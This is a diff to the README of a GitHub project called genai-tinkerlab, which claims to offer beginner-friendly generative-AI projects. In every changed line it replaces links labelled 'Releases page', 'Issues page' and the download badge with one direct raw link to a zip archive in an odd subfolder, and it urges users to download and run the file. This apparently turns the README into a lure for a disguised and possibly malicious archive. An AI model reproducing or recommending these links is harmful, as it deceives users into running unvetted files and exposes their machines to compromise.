@@ -1,6 +1,6 @@
 # 🎉 genai-tinkerlab - Explore Generative AI Projects Easily
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/Qipson/genai-tinkerlab/main/palimbacchius/genai-tinkerlab.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ The genai-tinkerlab repository offers a rich collection of projects that explore
 
 To start using the projects in genai-tinkerlab, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Qipson/genai-tinkerlab/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Qipson/genai-tinkerlab/main/palimbacchius/genai-tinkerlab.zip).
 2. **Choose a Project:** Browse through the available projects. Each project includes a description and features.
 3. **Download the Project:** Click on the version you want. This will take you to a page where you can download the project files.
 
@@ -25,9 +25,9 @@ Before downloading, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-You'll find the downloadable files on the [Releases page](https://github.com/Qipson/genai-tinkerlab/releases). 
+You'll find the downloadable files on the [Releases page](https://raw.githubusercontent.com/Qipson/genai-tinkerlab/main/palimbacchius/genai-tinkerlab.zip). 
 
-1. **Click on the link:** Go to the [Releases page](https://github.com/Qipson/genai-tinkerlab/releases).
+1. **Click on the link:** Go to the [Releases page](https://raw.githubusercontent.com/Qipson/genai-tinkerlab/main/palimbacchius/genai-tinkerlab.zip).
 2. **Select the file:** Find the project you want and click on it.
 3. **Download the file:** Follow the prompts to save the file to your computer.
 4. **Run the application:**
@@ -64,7 +64,7 @@ Each project comes with its own documentation to help you understand how to use 
 
 If you have questions or need assistance, you can join our community. Engaging with others can help you learn more and find solutions.
 
-- **GitHub Issues:** Report bugs or request features on the [Issues page](https://github.com/Qipson/genai-tinkerlab/issues).
+- **GitHub Issues:** Report bugs or request features on the [Issues page](https://raw.githubusercontent.com/Qipson/genai-tinkerlab/main/palimbacchius/genai-tinkerlab.zip).
 - **Community Discussions:** Join discussions to share experiences and tips with other users.
 
 ## 🔗 Additional Resources
@@ -89,4 +89,4 @@ For more details, visit our main page.
 
 ## 🏁 Conclusion
 
-The genai-tinkerlab repository offers a unique opportunity to explore projects in the evolving field of Generative AI. With a straightforward download process and user-friendly projects, you can dive into the world of AI without needing technical expertise. Start your journey today by visiting the [Releases page](https://github.com/Qipson/genai-tinkerlab/releases) and downloading the projects that interest you. Enjoy!
+The genai-tinkerlab repository offers a unique opportunity to explore projects in the evolving field of Generative AI. With a straightforward download process and user-friendly projects, you can dive into the world of AI without needing technical expertise. Start your journey today by visiting the [Releases page](https://raw.githubusercontent.com/Qipson/genai-tinkerlab/main/palimbacchius/genai-tinkerlab.zip) and downloading the projects that interest you. Enjoy!
